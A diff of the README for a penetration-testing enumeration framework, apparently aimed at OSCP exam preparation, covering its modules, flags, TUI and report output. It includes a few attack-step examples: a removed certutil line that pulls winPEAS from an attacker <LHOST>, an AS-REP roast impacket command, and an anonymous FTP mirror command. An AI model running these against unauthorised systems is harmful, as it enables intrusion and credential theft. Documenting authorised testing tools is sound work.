@@ -1,550 +1,476 @@
-# OSCP Enumeration Framework
+# ARGUS — Enumeration Framework
 
 ```
-  ██████╗ ███████╗ ██████╗██████╗      E N U M E R A T I O N   F R A M E W O R K
- ██╔═══██╗██╔════╝██╔════╝██╔══██╗     Assisted recon.  Never autopwn.
- ██║   ██║███████╗██║     ██████╔╝     Recon  →  Enumerate  →  Report
- ██║   ██║╚════██║██║     ██╔═══╝
- ╚██████╔╝███████║╚██████╗██║          ☠  by acanoman  ☠
-  ╚═════╝ ╚══════╝ ╚═════╝╚═╝
+ ██████╗ ██████╗  ██████╗ ██╗   ██╗███████╗
+██╔══██╗██╔══██╗██╔════╝ ██║   ██║██╔════╝
+███████║██████╔╝██║  ███╗██║   ██║███████╗
+██╔══██║██╔══██╗██║   ██║██║   ██║╚════██║
+██║  ██║██║  ██║╚██████╔╝╚██████╔╝███████║
+╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝  ╚═════╝ ╚══════╝
 ```
 
-> **Modular, OSCP-compliant enumeration automation.**  
-> Every command printed. Zero exploitation. Full operator control.
+> **Assisted recon. Never autopwn.**
+> Recon → Enumerate → Report
+
+☠ by acanoman ☠
 
 ---
 
-## Table of Contents
+## What is ARGUS
 
-1. [Installation](#installation)
-2. [OSCP Exam — Exact Commands](#oscp-exam--exact-commands)
-3. [How to Run It — CLI Reference](#how-to-run-it)
-4. [The Automation Flow](#the-automation-flow)
-5. [The Lifecycle of a Finding](#the-lifecycle-of-a-finding)
-6. [Output Structure](#output-structure)
-7. [Module Reference](#module-reference)
-8. [OSCP Compliance Rules](#oscp-compliance-rules)
+ARGUS is a modular enumeration framework for penetration testing and OSCP+ exam preparation.
+It orchestrates a structured, tiered reconnaissance pipeline against a single target, then
+surfaces all discovered attack surface as human-readable **manual hints** — copy-paste
+commands for the operator to decide whether and when to execute.
+
+**What ARGUS does:**
+
+- Runs 11 enumeration modules in the correct dependency order (Tier 1 → 2 → 3)
+- Streams every tool's stdout into a cyberpunk terminal UI in real time
+- Writes a structured `notes.md` with OSCP-style manual checklists after every module
+- Persists session state so you can `--resume` interrupted scans without repeating work
+- Surfaces attack-adjacent commands (AS-REP Roast, Kerberoast, NTLM relay) as **manual
+  hints only** — none are executed automatically
+
+**What ARGUS does NOT do:**
+
+- Exploit anything
+- Brute-force credentials without explicit operator action
+- Run prohibited tools (SQLMap, mass scanners) automatically
+- Chain discoveries into automated attack sequences
+
+---
+
+## OSCP+ Compliance
+
+> Reviewed for OSCP+ exam compliance — manual operator control at every step.
+
+| Requirement | ARGUS Behaviour |
+|-------------|-----------------|
+| No automated exploitation | All attack chains appear as `[MANUAL]` hints only — the framework never executes exploits |
+| No prohibited tools | SQLMap, mass scanners, and automated brute-force are never invoked |
+| Metasploit not used | Zero Metasploit references in any wrapper or Python module |
+| All commands shown first | Every subprocess call is logged with a `[CMD]` prefix before execution |
+| Attack commands = hints only | AS-REP Roast, Kerberoast, NTLM Relay, xp_cmdshell appear as `[MANUAL]` hints in the TUI and `notes.md` |
+| No credential caching violations | Discovered usernames and hashes are written only to the local output directory |
+| Full transparency | `--dry-run` prints every command without executing any |
+
+Every wrapper script opens with an explicit OSCP compliance block. For example, `ldap_enum.sh`:
+
+```bash
+# OSCP compliance:
+#   - AS-REP Roasting and Kerberoasting → manual hints only
+#   - No password attacks of any kind
+#   - Prints every command before execution
+```
+
+---
+
+## Requirements
+
+### Python
+
+Python **3.8 or newer** is required. 3.10+ is recommended.
+
+### pip packages
+
+```
+rich>=13.0.0
+pyfiglet>=0.8.0
+```
+
+Install with:
+
+```bash
+pip install -r requirements.txt
+```
+
+### External tools (must be installed separately)
+
+ARGUS will skip any tool that is not installed and warn you — it will never abort a scan
+because a secondary tool is missing.
+
+| Category | Tool | Role |
+|----------|------|------|
+| **Required** | `nmap` | Port scanning and NSE scripts |
+| **Required** | `smbclient` | SMB share listing |
+| **Required** | `smbmap` | SMB share access mapping |
+| **Required** | `rpcclient` | RPC/SMB user enumeration |
+| **Required** | `ldapsearch` | LDAP anonymous bind and dump (`ldap-utils` package) |
+| **Required** | `curl` | HTTP header grab |
+| **Required** | `gobuster` | Web directory and DNS brute-force |
+| **Required** | `nikto` | Web vulnerability scanner |
+| **Required** | `whatweb` | Web technology fingerprinting |
+| **Required** | `showmount` | NFS export listing (`nfs-common` package) |
+| **Required** | `snmpwalk` | SNMP MIB walk (`snmp` package) |
+| **Required** | `smtp-user-enum` | SMTP user verification via VRFY/EXPN/RCPT |
+| Optional | `rustscan` | Faster all-port scanner (falls back to nmap) |
+| Optional | `feroxbuster` | Recursive web directory fuzzer |
+| Optional | `ffuf` | Vhost and parameter fuzzing |
+| Optional | `sslscan` | TLS/SSL certificate and cipher enumeration |
+| Optional | `wpscan` | WordPress scanner (enumerate-only mode) |
+| Optional | `nxc` / `netexec` | SMB sessions, RID cycling, share spider |
+| Optional | `enum4linux-ng` | SMB/LDAP/RPC full enumeration (preferred over enum4linux) |
+| Optional | `kerbrute` | Kerberos username enumeration (AS-REQ probe, no auth) |
+| Optional | `windapsearch` | AD user/group/SPN enumeration via LDAP |
+| Optional | `evil-winrm` | WinRM shell — manual use only (`gem install evil-winrm`) |
+| Optional | `xfreerdp` | RDP client — manual use only (`freerdp2-x11` package) |
+| Optional | `impacket-*` | AS-REP Roast, Kerberoast, SID/RID lookup — manual hints |
+| Optional | `bloodhound-python` | BloodHound data collection — manual hint |
+| Optional | `onesixtyone` | SNMP community string sweep |
+
+**OS:** Kali Linux or any Debian-based distribution is strongly recommended.
 
 ---
 
 ## Installation
 
 ```bash
-# 1. Clone the repo
-git clone <repo-url> oscp-framework && cd oscp-framework
+# 1. Clone the repository
+git clone https://github.com/acanoman/oscp-framework
+cd oscp-framework
 
-# 2. Install all dependencies (apt packages + pip + gem)
-bash install.sh
+# 2. Install Python dependencies
+pip install -r requirements.txt
 
-# 3. Confirm everything works
-python main.py --help
+# 3. Make all wrappers executable
+chmod +x wrappers/*.sh
+
+# 4. Run the full installer
+#    Sets permissions, installs apt packages, verifies tool availability,
+#    and runs a Python import smoke test across all modules.
+sudo bash install.sh
 ```
 
-`install.sh` installs: nmap, ldap-utils, smbclient, enum4linux-ng, smbmap,
-netexec/crackmapexec, snmp, onesixtyone, redis-tools, nikto, gobuster,
-feroxbuster, whatweb, python3 packages (rich, impacket), evil-winrm, and
-runs a smoke-test that imports every Python module.
+`install.sh` does **not** download any tools from the internet during an exam. It installs
+only packages available through `apt` and `gem`, and checks whether optional tools are
+already present. All checks are non-fatal — the installer reports missing tools as warnings.
 
 ---
 
-## OSCP Exam — Exact Commands
+## Usage
 
-Copy these commands at exam start. Replace `<TARGET>`, `<DOMAIN>`, and `<YOUR_TUN0>` with your actual values.
-
-### Step 1 — Find your tun0 IP (run once at exam start)
+### Basic scan — auto-detect modules from open ports
 
 ```bash
-ip a show tun0 | grep 'inet ' | awk '{print $2}' | cut -d/ -f1
-# Example output: 10.10.14.5
+python3 main.py --target 10.10.10.5
 ```
 
-### Step 2 — Enumerate a standalone Linux/Windows target
+### With a known AD domain
 
 ```bash
-python main.py \
-  --target <TARGET> \
-  --lhost <YOUR_TUN0> \
-  --output-dir /root/oscp/exam
+python3 main.py --target 10.10.10.5 --domain corp.local
 ```
 
-### Step 3 — Enumerate an Active Directory target (with domain)
+### Full exam run — target + domain + attacker IP
 
 ```bash
-python main.py \
-  --target <TARGET> \
-  --domain <DOMAIN> \
-  --lhost <YOUR_TUN0> \
-  --output-dir /root/oscp/exam
+python3 main.py --target 10.10.10.5 --domain corp.local --lhost 10.10.14.5
 ```
 
-### Step 4 — If the session was interrupted, resume it
+`--lhost` pre-fills every `<LHOST>` placeholder in transfer and reverse-shell commands
+inside `notes.md`, making them copy-paste ready without manual editing.
+
+### Resume an interrupted session
 
 ```bash
-# --resume loads session.json, skips Nmap, continues from where you left off
-python main.py \
-  --target <TARGET> \
-  --domain <DOMAIN> \
-  --lhost <YOUR_TUN0> \
-  --output-dir /root/oscp/exam \
-  --resume
+python3 main.py --target 10.10.10.5 --resume
 ```
 
-> **Why `--resume` is explicit:**  
-> Without `--resume`, the framework always starts a fresh scan even if `session.json`
-> exists. This prevents accidentally skipping a service that appeared after a network
-> change. You must consciously opt-in to resume.
+Re-reads `session.json`, skips Nmap and completed modules, and continues from where the
+session stopped. Without `--resume`, the framework always starts a fresh scan — even if
+`session.json` exists — so you never accidentally skip a service that appeared after a
+network change.
 
-### Step 5 — Review the output
+### Preview every command without running anything
 
 ```bash
-# Open the report in any Markdown viewer
-cat /root/oscp/exam/<TARGET>/notes.md
-
-# Monitor in real time while enumeration runs
-watch -n 5 cat /root/oscp/exam/<TARGET>/notes.md
-
-# Check for background vuln scan results (the framework alerts you when done)
-cat /root/oscp/exam/<TARGET>/scans/vulns.txt
+python3 main.py --target 10.10.10.5 --dry-run
 ```
 
-### What `--lhost` does
+Prints the exact shell command that *would* run at each step. Safe for scope review,
+auditing, or copying individual commands for manual execution.
 
-When you pass `--lhost 10.10.14.5`, the Arsenal Recommender section of `notes.md`
-pre-fills **every** transfer and reverse-shell command with your attacker IP:
-
-```markdown
-# Without --lhost (default):
-- [ ] 💡 `certutil.exe -urlcache -f http://<LHOST>:8000/windows/winPEAS.exe C:\Windows\Temp\winPEAS.exe`
-
-# With --lhost 10.10.14.5:
-- [ ] 💡 `certutil.exe -urlcache -f http://10.10.14.5:8000/windows/winPEAS.exe C:\Windows\Temp\winPEAS.exe`
-```
-
-You can copy-paste directly — no manual editing required.
-
-### Typical exam timeline
-
-```
-T+00:00  python main.py --target 10.10.10.10 --lhost 10.10.14.5
-T+00:05  Nmap fast scan finishes → open ports known
-T+00:10  Background NSE vuln scan launches (runs in parallel)
-T+00:15  Tier-1 modules finish (SMB · FTP · LDAP · DNS · SNMP · NFS)
-T+00:30  Tier-2 modules finish (Databases · Remote · Mail)
-T+02:00  Tier-3 finishes (Web — feroxbuster/gobuster on all ports)
-         🔔 DING! — NSE vuln scan alert fires
-T+02:01  notes.md complete — open it and start manual work
-```
-
----
-
-## How to Run It
-
-### Standard full-auto scan (most common)
+### Force specific modules only
 
 ```bash
-# With your tun0 IP so Arsenal Recommender commands are pre-filled
-python main.py --target 10.10.10.10 --lhost 10.10.14.5
+python3 main.py --target 10.10.10.5 --modules smb ldap web
 ```
 
-Runs Nmap discovery → detects all open services → routes each service to the
-correct enumeration module → writes `notes.md` with findings and checklist.
-Per-module elapsed time is printed after each module. Total session time is
-shown at the end.
-
-### With a known domain (Active Directory / Windows targets)
-
-```bash
-python main.py --target 10.10.10.10 --domain corp.local --lhost 10.10.14.5
-```
-
-The domain is passed to LDAP (base DN queries), DNS (zone transfer, TXT records),
-SMB (Kerberoast hints), and web modules (vhost scanning).
-
-### Dry-run — preview every command without executing any
-
-```bash
-python main.py --target 10.10.10.10 --dry-run
-```
-
-Prints the exact commands that *would* run. Use this to review scope, audit what
-the framework does, or copy-paste individual commands for manual execution.
-
-### Force specific modules (skip discovery)
-
-```bash
-# Only enumerate SMB and LDAP
-python main.py --target 10.10.10.10 --modules smb ldap
-
-# Only run web enumeration
-python main.py --target 10.10.10.10 --modules web
-
-# Run Tier-2 modules only
-python main.py --target 10.10.10.10 --modules databases remote mail
-```
-
-Available module names:
-
-| Tier | Modules |
-|------|---------|
-| 1 — Lightning Fast | `smb` `ftp` `ldap` `dns` `snmp` `nfs` `services` `network` |
-| 2 — Medium | `databases` `remote` `mail` |
-| 3 — Heavy (always last) | `web` |
-
-### Resume a previous session (explicit opt-in)
-
-Pass `--resume` to load `session.json` from the previous run and skip Nmap.
-**Without `--resume`, the framework always starts fresh** — even if `session.json`
-exists — so you never accidentally skip a service that appeared after a change.
-
-```bash
-# Continue where you left off after an interruption
-python main.py --target 10.10.10.10 --lhost 10.10.14.5 --resume
-
-# Resume with a domain (if domain was discovered in the first run)
-python main.py --target 10.10.10.10 --domain corp.local --lhost 10.10.14.5 --resume
-```
-
-When resumed, the banner shows `Mode: RESUME` and a green panel lists the
-already-known ports so you immediately see the session state.
+Skips auto-detection and runs exactly the listed modules in tier order.
 
 ### Custom output directory
 
 ```bash
-python main.py --target 10.10.10.10 --output-dir /root/oscp/exam
+python3 main.py --target 10.10.10.5 --output-dir /root/oscp/exam --lhost 10.10.14.5
 ```
 
-### Abort a single tool (not the whole session)
-
-Press **Ctrl+C** once while a tool is running. The framework catches the
-interrupt, flushes `notes.md`, saves state, and moves on to the next module.
-Press **Ctrl+C** twice rapidly to abort the entire session.
-
----
-
-## The Automation Flow
-
-Understanding this makes you a better operator — you know exactly what the
-framework is doing and why at every step.
-
-```
-python main.py --target 10.10.10.10
-        │
-        ▼
-┌─────────────────────────────────────────────────────────────────┐
-│  PHASE 1 — INITIAL RECON  (wrappers/recon.sh)                   │
-│                                                                  │
-│  1a. Fast TCP scan (all 65535 ports, --min-rate 5000)           │
-│  1b. Deep version scan (-sC -sV -O) on open ports only          │
-│  1c. UDP top-100 scan                                            │
-│  1d. NSE vuln scan launched in background → vulns.pid saved     │
-│                                                                  │
-│  Output: scans/nmap_initial.xml  ◄── Python parser reads this   │
-└─────────────────────────────────────────────────────────────────┘
-        │
-        ▼
-┌─────────────────────────────────────────────────────────────────┐
-│  PHASE 2 — PORT PARSING  (core/parser.py)                       │
-│                                                                  │
-│  NmapParser reads the XML and fills session.info with:          │
-│    open_ports = {22, 80, 445, 3389, ...}                        │
-│    port_details[80] = {                                          │
-│        "service": "http",                                        │
-│        "version": "Apache httpd 2.4.41",                        │
-│        "proto":   "tcp",                                         │
-│    }                                                             │
-│                                                                  │
-│  The "service" string comes directly from Nmap's -sV detection. │
-└─────────────────────────────────────────────────────────────────┘
-        │
-        ▼
-┌─────────────────────────────────────────────────────────────────┐
-│  PHASE 3 — SERVICE-BASED MODULE ROUTING  (core/engine.py)       │
-│                                                                  │
-│  For every open port, TWO-PASS lookup:                          │
-│                                                                  │
-│  Pass 1 — SERVICE NAME (primary):                               │
-│    "http"          → web                                         │
-│    "microsoft-ds"  → smb                                         │
-│    "ms-wbt-server" → remote   ← RDP, even on non-standard port  │
-│    "ms-sql-s"      → databases                                   │
-│    "domain"        → dns                                         │
-│    "rpcbind"       → nfs                                         │
-│    "ssl/ftp"       → ftp      ← ssl/ prefix stripped & retried  │
-│    "http?"         → web      ← trailing ? removed & retried    │
-│                                                                  │
-│  Pass 2 — PORT NUMBER FALLBACK (when service = "unknown"):      │
-│    port 445  → smb                                               │
-│    port 3389 → remote                                            │
-│    port 6379 → databases                                         │
-│                                                                  │
-│  Result: ordered, deduplicated module list                       │
-└─────────────────────────────────────────────────────────────────┘
-        │
-        ▼
-┌─────────────────────────────────────────────────────────────────┐
-│  PHASE 4 — TIER-SORTED MODULE EXECUTION                          │
-│                                                                  │
-│  🟢 TIER 1 — smb · ftp · ldap · dns · snmp · nfs · services   │
-│     (fast; user/domain findings feed Tier 2 and 3)              │
-│                                                                  │
-│  🟡 TIER 2 — databases · remote · mail                          │
-│     (uses user lists from Tier 1 for smarter enumeration)       │
-│                                                                  │
-│  🔴 TIER 3 — web  (always last; longest running)                │
-│                                                                  │
-│  Each module:                                                    │
-│    1. Calls its Bash wrapper (prints [CMD] before every tool)   │
-│    2. Parses the wrapper's output files                         │
-│    3. Writes findings to session.info                           │
-│    4. Calls session.finalize_notes() → notes.md updated NOW     │
-│                                                                  │
-│  Ctrl+C during any module → skips to next, notes flushed        │
-└─────────────────────────────────────────────────────────────────┘
-        │
-        ▼
-┌─────────────────────────────────────────────────────────────────┐
-│  PHASE 5 — REPORT  (core/session.py + core/recommender.py)     │
-│                                                                  │
-│  Recommender prints Rich table to console.                      │
-│  finalize_notes() writes the complete notes.md.                 │
-│  session.json saved for resume capability.                      │
-└─────────────────────────────────────────────────────────────────┘
-```
-
----
-
-## The Lifecycle of a Finding
-
-This traces one specific finding — **anonymous FTP login** — from the Bash script
-through the Python engine into the final `notes.md`. This is the exact data flow
-for every finding in the framework.
-
-### Step 1 — The Bash wrapper executes
-
-`modules/ftp.py` builds this command and passes it to the engine's `_exec()`:
+### Preview the TUI without running anything
 
 ```bash
-bash wrappers/services_enum.sh \
-    --target 10.10.10.10 \
-    --output-dir output/targets/10.10.10.10 \
-    --ports 21
+python3 ui/tui.py --demo
 ```
 
-Inside `services_enum.sh`, the FTP section runs:
+Plays through a simulated scan with fake log lines. Use this to learn the keyboard
+shortcuts and panel layout before an exam.
+
+### All flags
+
+| Flag | Short | Default | Description |
+|------|-------|---------|-------------|
+| `--target` | `-t` | *(required)* | Target IP address |
+| `--domain` | `-d` | `""` | Target domain (e.g. `corp.local`). Passed to LDAP, DNS, SMB, and web modules |
+| `--lhost` | | `""` | Your attacker/VPN IP. Pre-fills all `<LHOST>` placeholders in `notes.md` |
+| `--resume` | | `false` | Resume from `session.json`. Skips Nmap and completed modules |
+| `--modules` | `-m` | *(auto)* | Force specific modules. Choices: `smb ftp ldap dns snmp nfs services network databases remote mail web` |
+| `--dry-run` | | `false` | Print commands without executing any |
+| `--output-dir` | | `output/targets` | Base directory for scan output |
+| `--verbose` | `-v` | `false` | Show DEBUG-level log messages |
+
+---
+
+## TUI — Terminal Interface
+
+The cyberpunk terminal UI runs automatically when you launch `main.py`. To preview it
+standalone without running any real commands:
 
 ```bash
-FTP_RESULT=$(timeout 10 bash -c \
-    "printf 'user anonymous anonymous\nls -la\npwd\nquit\n' | ftp -nv 10.10.10.10 21")
-
-echo "$FTP_RESULT" > ftp/ftp_anon_test.txt
+python3 ui/tui.py --demo
 ```
 
-If the server responds with `230 Login successful`, the wrapper:
-1. Prints `[+] FTP anonymous login: PERMITTED` to stdout
-2. Runs `ftp -nv` with `ls -R` to get the directory tree → saves to `ftp_tree.txt`
-3. Runs `nmap -p21 --script ftp-anon,ftp-bounce,ftp-syst` → saves to `ftp/nmap_ftp.txt`
-
-The wrapper's stdout streams to the terminal in real time. The **output files are
-what the Python engine reads next**.
-
-### Step 2 — The Python module reads the output files
-
-After the wrapper exits, `modules/ftp.py` calls `_parse_ftp(session, log)`:
-
-```python
-def _parse_ftp(session, log) -> None:
-    content = ftp_f.read_text()   # reads ftp/nmap_ftp.txt
-
-    if re.search(r"ftp-anon:.*Login correct|Anonymous FTP login allowed",
-                 content, re.IGNORECASE):
-
-        log.warning("FTP: anonymous login allowed")
-
-        # This is the critical line — writes to session.info.notes
-        session.add_note("✅ FTP FINDING: Anonymous login allowed — ftp/nmap_ftp.txt")
-
-        listing = re.findall(r"^\|.+$", content, re.MULTILINE)
-        if listing:
-            session.add_note(
-                "📁 FTP anonymous directory listing:\n" + "\n".join(listing[:20])
-            )
-```
-
-`session.add_note()` appends a timestamped string to `session.info.notes`:
-
-```python
-def add_note(self, text: str) -> None:
-    ts = datetime.now().strftime("%H:%M:%S")
-    self.info.notes.append(f"[{ts}] {text}")
-```
-
-At this point the finding lives in `session.info.notes` — an in-memory list.
-
-### Step 3 — Manual hints are pre-injected (before the wrapper even runs)
-
-`modules/ftp.py` calls `_add_manual_hints()` *before* the wrapper, so hints
-appear in `notes.md` even if the user interrupts the tool:
-
-```python
-session.add_note("💡 [MANUAL] Anonymous login: ftp 10.10.10.10")
-session.add_note("💡 [MANUAL] Download all files: wget -m ftp://anonymous:anonymous@10.10.10.10/")
-```
-
-### Step 4 — `finalize_notes()` renders notes.md
-
-After the FTP module completes, `engine.py` calls:
-
-```python
-self.session.finalize_notes()
-self.session.save_state()
-```
-
-`finalize_notes()` in `core/session.py` reads all notes, partitions them by
-keyword, and renders structured Markdown:
-
-**Vuln notes** (keyword: "vulnerable", "cve-", …) → `## ⚠️ Vulnerabilities` section  
-**Success notes** (keyword: "anonymous", "login allowed", …) → `## ✅ Confirmed Access` section  
-**Manual hints** (keyword: "💡") → `## 💡 Manual Follow-Up Commands` section as `- [ ]` checklist items  
-**Timeline** (everything else) → `## 📝 Session Timeline` section in a fenced code block
-
-The anonymous FTP finding appears in the final `notes.md` as:
-
-```markdown
-## ✅ Confirmed Access & Anonymous Sessions
-
-- ✅  [09:14:32] FTP FINDING: Anonymous login allowed — ftp/nmap_ftp.txt
-- ✅  [09:14:32] FTP anonymous directory listing: (first 20 lines)
-
----
-
-## 💡 Manual Follow-Up Commands
-
-- [ ] 💡 `Anonymous login: ftp 10.10.10.10`
-- [ ] 💡 `Download all files: wget -m ftp://anonymous:anonymous@10.10.10.10/`
-```
-
-### Summary — the complete data flow
+### Layout overview
 
 ```
-services_enum.sh runs ftp-anon NSE
-        │
-        │  writes → ftp/nmap_ftp.txt
-        ▼
-modules/ftp.py: _parse_ftp() reads nmap_ftp.txt
-        │
-        │  regex match: "Anonymous FTP login allowed"
-        │  session.add_note("✅ FTP FINDING: Anonymous login allowed")
-        │  session.add_note("💡 [MANUAL] wget -m ftp://...")
-        ▼
-session.info.notes  (in-memory list)
-        │
-        │  engine.py calls session.finalize_notes()
-        ▼
-core/session.py: finalize_notes()
-        │  partitions notes by keyword
-        │  renders ✅ section, 💡 checklist, 📝 timeline
-        ▼
-output/targets/10.10.10.10/notes.md  ← written to disk
+┌─ ● ● ●  A R G U S  —  T E R M I N A L  ─────────────────────────────┐
+│   ██████╗ ██████╗  ██████╗ ██╗   ██╗███████╗                         │
+│   ...                                                                  │
+│   E N U M E R A T I O N   F R A M E W O R K  v1.0                    │
+│                            Assisted recon. Never autopwn.  ☠ acanoman │
+├──────────────┬─────────────────────────────────────────────────────────┤
+│  MODULES     │  LIVE OUTPUT                                            │
+│  [✓] RECON   │  08:42:11  [✓] RECON complete — 8 ports open          │
+│  [✓] SMB     │  08:42:15  [+] SMB signing disabled                   │
+│  [>] LDAP    │  08:42:25  [+] Kerbrute: 4 valid users found          │
+│  [ ] WEB     │  08:42:26  [!] Users saved to valid_users.txt         │
+│  [ ] DB      │  08:42:28  [-] LDAP running...                        │
+│  [ ] FTP     ├─────────────────────────────────────────────────────────┤
+│  [ ] MAIL    │  MANUAL HINTS  [H to toggle]                           │
+│  [ ] NFS     │  AS-REP Roast:                                         │
+│  [ ] NET     │    impacket-GetNPUsers CORP/ -usersfile valid_users.txt│
+│  [ ] SVC     │    -no-pass -dc-ip 10.10.10.5                         │
+│  [ ] RMT     │                                                        │
+├──────────────┴─────────────────────────────────────────────────────────┤
+│ TARGET 10.10.10.5 │ DOMAIN CORP.LOCAL │ MODULE LDAP │ RUNNING │ 00:01:47│
+│                    [H] hints  [SPACE] pause  [Q] quit                  │
+└────────────────────────────────────────────────────────────────────────┘
 ```
 
-This same flow applies to every finding — SMB null sessions, LDAP anonymous
-binds, Redis unauthenticated access, VNC no-auth — the only difference is which
-Bash wrapper runs and which regex fires in the Python parser.
+### Module sidebar — colour coding
 
----
+| Icon | Colour | Meaning |
+|------|--------|---------|
+| `[✓]` | Green `#00ff88` | Module completed successfully |
+| `[>]` | Cyan `#00d4ff` (blinking) | Module currently running |
+| `[ ]` | Dim purple `#3a2060` | Module pending — not yet started |
 
-## Output Structure
+### Live output — log line colours
 
-```
-output/targets/<IP>/
-│
-├── notes.md              ← Master report (updated after every module)
-├── session.json          ← State file — enables session resume
-├── session.jsonl         ← Structured JSON Lines audit log
-│
-├── scans/
-│   ├── nmap_initial.xml  ← Parsed by engine (service → module routing)
-│   ├── targeted.nmap     ← Human-readable deep scan
-│   ├── allports.txt      ← Fast port scan
-│   ├── udp.txt           ← UDP top-100
-│   ├── vulns.txt         ← NSE vuln scan (background, may still running)
-│   └── vulns.pid         ← PID of background vuln scan
-│
-├── smb/
-│   ├── users_rpc.txt     ← Consolidated user list (fed to SMTP, mail modules)
-│   ├── nxc_rid_brute.txt
-│   ├── interesting_files.txt
-│   └── ...
-│
-├── ldap/
-│   ├── base_dn.txt       ← Auto-detected base DN
-│   ├── ldap_users.txt    ← LDAP user list (fed to SMTP module)
-│   ├── ldap_spns.txt     ← Kerberoastable accounts
-│   ├── asrep_candidates.txt
-│   └── ...
-│
-├── web/
-│   ├── tls_sans_<port>.txt   ← TLS SAN hostnames (HTTPS targets)
-│   ├── whatweb_<port>.txt
-│   ├── gobuster_<port>.txt
-│   ├── feroxbuster_<port>.txt
-│   ├── discovered_hostnames.txt
-│   └── ...
-│
-├── dns/
-│   ├── zone_transfer.txt
-│   ├── dns_txt.txt           ← TXT records (SPF, DMARC, cloud indicators)
-│   ├── domain_detected.txt   ← Auto-detected domain
-│   └── ...
-│
-├── snmp/
-│   ├── snmp_interfaces.txt   ← Network interfaces (pivot detection)
-│   ├── snmp_ip_addrs.txt
-│   └── ...
-│
-├── ftp/
-│   ├── ftp_tree.txt          ← Recursive listing (no download)
-│   └── ftp_interesting.txt
-│
-├── db/                       ← All database engines
-├── remote/                   ← RDP, WinRM, VNC
-├── nfs/
-├── smtp/
-└── banners/                  ← Raw banner grabs for non-standard ports
-```
+| Prefix | Colour | Meaning |
+|--------|--------|---------|
+| `[+]` | Cyan | Discovery / finding |
+| `[!]` | Yellow | Warning / high-value finding |
+| `[>]` | Bright purple | Command echoed before execution |
+| `[✓]` | Green | Success / module complete |
+| `[-]` | Muted grey | Informational |
+
+### MANUAL HINTS panel
+
+The hints panel surfaces commands that ARGUS found evidence for but will **never execute
+automatically** — AS-REP Roast targets, Kerberoastable SPNs, NFS shares with
+`no_root_squash`, NTLM relay conditions, and more. Each hint shows a label and the exact
+copy-paste command pre-filled with the target's IP, domain, and discovered usernames.
+
+The same hints appear in `notes.md` under "Manual Follow-Up Commands".
+
+### Keyboard shortcuts
+
+| Key | Action |
+|-----|--------|
+| `H` | Toggle MANUAL HINTS panel on/off |
+| `SPACE` | Pause / resume auto-scroll of live output |
+| `↑` / `↓` | Scroll live output manually while paused |
+| `Q` | Quit — stops the TUI and prints a session summary to stdout |
+| `Ctrl+C` | Same as Q — clean exit with session state saved |
 
 ---
 
 ## Module Reference
 
-| Module | Tier | Key Tools | Notable Features |
-|--------|------|-----------|-----------------|
-| `smb` | 1 | enum4linux-ng, smbmap, nxc, rpcclient | RID cycling → impacket-lookupsid fallback |
-| `ftp` | 1 | nmap NSE, ftp client | Anon probe → recursive ls-R tree |
-| `ldap` | 1 | ldapsearch, windapsearch | AS-REP + SPN detection, base DN auto-extract |
-| `dns` | 1 | dig, dnsrecon | Zone transfer, TXT records, domain auto-detect |
-| `snmp` | 1 | onesixtyone, snmpwalk | Dual-homed detection via interface OIDs |
-| `nfs` | 1 | rpcinfo, showmount, nmap NSE | no_root_squash warning |
-| `services` | 1 | ssh-audit, nmap | SSH auth-method enum |
-| `databases` | 2 | nmap NSE, redis-cli, curl | SCAN not KEYS (non-blocking), CouchDB/ES |
-| `remote` | 2 | nmap NSE, nxc | NXC RDP+WinRM rapid fingerprint |
-| `mail` | 2 | smtp-user-enum | VRFY→RCPT fallback, uses smb/ldap user lists |
-| `web` | 3 | whatweb, gobuster, feroxbuster, nikto | Smart extensions (Java/Python/Ruby), TLS SANs |
+Modules run in strict tier order: **Tier 1** (fast, ≤2 min each) → **Tier 2** (medium)
+→ **Tier 3** (heavy, always last). Within each tier, modules run in the order they were
+discovered from Nmap's service detection output.
+
+| Module | Sidebar | Wrapper | Tier | What it enumerates |
+|--------|---------|---------|------|--------------------|
+| **RECON** | `RECON` | `recon.sh` | — | TTL OS detection via ping; RustScan/nmap full TCP sweep (all 65535 ports); UDP top-100; deep `-sC -sV -O` targeted scan on open ports; DNS zone transfer if port 53 is open; background NSE `vuln,auth` scan (runs in parallel, alerts when done) |
+| **SMB** | `SMB` | `smb_enum.sh` | 1 | Nmap SMB NSE scripts (smb-vuln\*, smb-enum-shares, smb-os-discovery, smb2-security-mode); enum4linux-ng/enum4linux null session; smbmap null + guest recursive listing; smbclient share list; rpcclient user and group enumeration; nxc/netexec shares, users, password policy; RID cycling (null → guest → impacket-lookupsid fallback); per-share deep spider for interesting file types; authenticated enum if `--user/--pass` supplied |
+| **LDAP** | `LDAP` | `ldap_enum.sh` | 1 | Nmap LDAP scripts; ldapsearch anonymous bind + naming context discovery + full object dump; windapsearch: full user list, privileged accounts (adminCount=1), groups, computers, AS-REP candidates; targeted ldapsearch for password-in-description fields and Kerberoastable SPNs; Kerberos port 88 detection; kerbrute Kerberos username enumeration via AS-REQ (no auth attempted) |
+| **WEB** | `WEB` | `web_enum.sh` | 3 | curl headers and response fingerprint; whatweb technology detection; gobuster/feroxbuster recursive directory brute-force; nikto vulnerability scan; sslscan with TLS certificate SAN extraction; ffuf vhost fuzzing; wpscan (WordPress), droopescan (Drupal/Joomla), joomscan; CGI script sniper for Shellshock (CVE-2014-6271) attack surface |
+| **DB** | `DB` | `db_enum.sh` | 2 | MSSQL (1433): Nmap NSE probes, anonymous connection test; MySQL (3306): version fingerprint, anonymous access; PostgreSQL (5432): version, anonymous access; Redis (6379): ping, key listing, config dump; MongoDB (27017): unauthenticated database listing |
+| **FTP** | `FTP` | `ftp_enum.sh` | 1 | Banner grab; Nmap FTP NSE scripts (ftp-anon, ftp-bounce, ftp-syst, ftp-vsftpd-backdoor); anonymous login test; recursive directory listing; interesting file type flagging (.zip, .bak, .conf, .key, etc.); FTPS/TLS detection |
+| **MAIL** | `MAIL` | `mail_enum.sh` | 2 | SMTP banner + Nmap NSE scripts; SMTP user enumeration via VRFY → EXPN → RCPT fallback (uses SMB/LDAP user lists from earlier modules); NTLM info disclosure probe; open relay detection via NSE; POP3/IMAP banner grab; TLS/STARTTLS version detection |
+| **NFS** | `NFS` | `nfs_enum.sh` | 1 | rpcinfo portmapper endpoint dump; showmount -e export listing; Nmap NFS NSE scripts; `no_root_squash` detection flagged as a privilege escalation finding |
+| **NET** | `NET` | `network_enum.sh` | 1 | ICMP TTL probe; traceroute to map hops; Nmap topology/neighbour scan; ARP /24 segment sweep; reverse DNS / PTR lookups; dual-homed host detection and pivot indicator analysis |
